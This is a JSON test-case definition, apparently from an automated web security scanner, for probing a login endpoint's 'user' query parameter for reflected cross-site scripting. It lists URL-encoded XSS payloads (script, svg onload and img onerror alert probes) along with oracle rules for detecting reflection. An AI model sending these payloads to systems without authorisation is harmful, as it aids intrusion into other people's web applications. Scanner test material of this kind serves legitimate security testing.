    {
      "id": "tc-hyp-GET-1-xss_reflected-1",
      "hypothesis_id": "hyp-GET-1-xss_reflected",
      "base_url": "http",
      "method": "GET",
      "endpoint": "/login",
      "parameter": "user",
      "payloads": [
        {
          "tier": "benign",
          "payloads": [
            {
              "location": "query",
              "value": "user=mail@example.com"
            }
          ],
          "description": "Baseline parameter to establish reflection baseline",
          "header": []
        },
        {
          "tier": "probe",
          "payloads": [
            {
              "location": "query",
              "value": "user=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
            }
          ],
          "description": "HTML/JS tag injection to test reflection and encoding",
          "encoding": "url",
          "header": []
        },
        {
          "tier": "probe",
          "payloads": [
            {
              "location": "query",
              "value": "user=%22%27%3E%3Csvg%2Fonload%3Dconfirm(1)%3E"
            }
          ],
          "description": "Breaking out of attributes and injecting SVG-based payload",
          "encoding": "url",
          "header": []
        },
        {
          "tier": "probe",
          "payloads": [
            {
              "location": "query",
              "value": "user=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"
            }
          ],
          "description": "IMG onerror XSS probe",
          "encoding": "url",
          "header": []
        },
        {
          "tier": "probe",
          "payloads": [
            {
              "location": "query",
              "value": "user=%3Cscript%3E/*x*/%3C%2Fscript%3E"
            }
          ],
          "description": "Script tag with comment to detect naive filters",
          "encoding": "url",
          "header": []
        }
      ],
      "prerequisites": [],
      "oracle_rules": [
        {
          "signal": "reflected_input",
          "condition": "response.status in [200] and any(p in response.body for p in [\"<script>alert(1)</script>\",\"\\\"\"><svg/onload=confirm(1)>\",\"<img src=x onerror=alert(1)>\",\"<script>/*x*/</script>\"] )",
          "threshold": {
            "expected_codes": [
              200
            ]
          },
          "weight": 1.0
        },
        {
          "signal": "response_length_diff",
          "condition": "abs(response.body_length - baseline.body_length) / max(baseline.body_length,1) >= 0.2",
          "threshold": {
            "body_length_delta_pct": 20.0
          },
          "weight": 0.5
        },
        {
          "signal": "error_signature",
          "condition": "regex_search(response.body, '(template|render|jsx|mustache|handlebars|react|vue).*(error|exception|stack)')",
          "threshold": {},
          "weight": 0.3
        }
      ],
      "pass_logic": "any",
      "safety": {
        "idempotent_required": true,
        "destructive_ok": false,
        "max_requests": 10
      },
      "max_retries": 1,
      "delay_between_requests": 0.2,
      "tags": [
        "xss_reflected",
        "dom"
      ],
      "estimated_duration": 2
    },
